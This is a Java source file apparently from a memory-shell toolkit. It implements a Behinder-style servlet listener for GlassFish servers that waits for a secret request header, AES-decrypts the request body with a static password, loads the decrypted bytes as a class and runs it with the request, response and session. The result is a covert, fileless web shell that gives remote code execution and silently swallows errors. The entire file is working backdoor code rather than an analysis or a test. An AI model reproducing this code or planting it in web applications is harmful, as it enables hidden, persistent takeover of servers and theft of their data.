package com.reajason.javaweb.memshell.glassfish.behinder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
public class BehinderListener extends ClassLoader implements ServletRequestListener {
    public static String pass;
    public static String headerName;
    public static String headerValue;

    public BehinderListener() {
    }

    public BehinderListener(ClassLoader z) {
        super(z);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    @SuppressWarnings("deprecation")
    public Class<?> g(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    @Override
    @SuppressWarnings("all")
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            if (request.getHeader(headerName) != null
                    && request.getHeader(headerName).contains(headerValue)) {
                HttpServletResponse response = this.getResponseFromRequest(request);
                HttpSession session = ((HttpServletRequest) request).getSession();
                Map<String, Object> obj = new HashMap<String, Object>(3);
                obj.put("request", request);
                obj.put("response", getInternalResponse(response));
                obj.put("session", session);
                session.setAttribute("u", this.pass);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
                Object instance = (new BehinderListener(this.getClass().getClassLoader())).g(bytes).newInstance();
                instance.equals(obj);
            }
        } catch (Exception ignored) {
        }
    }

    public HttpServletResponse getInternalResponse(HttpServletResponse response) {
        while (true) {
            try {
                response = (HttpServletResponse) getFieldValue(response, "response");
            } catch (Exception e) {
                return response;
            }
        }
    }

    private HttpServletResponse getResponseFromRequest(HttpServletRequest request) throws Exception {
        HttpServletResponse response = null;
        try {
            response = (HttpServletResponse) getFieldValue(getFieldValue(request, "request"), "response");
        } catch (Exception e) {
            try {
                response = (HttpServletResponse) getFieldValue(request, "response");
            } catch (Exception ee) {
                // glassfish7
                response = (HttpServletResponse) getFieldValue(getFieldValue(request, "reqFacHelper"), "response");
            }
        }
        return response;
    }

}
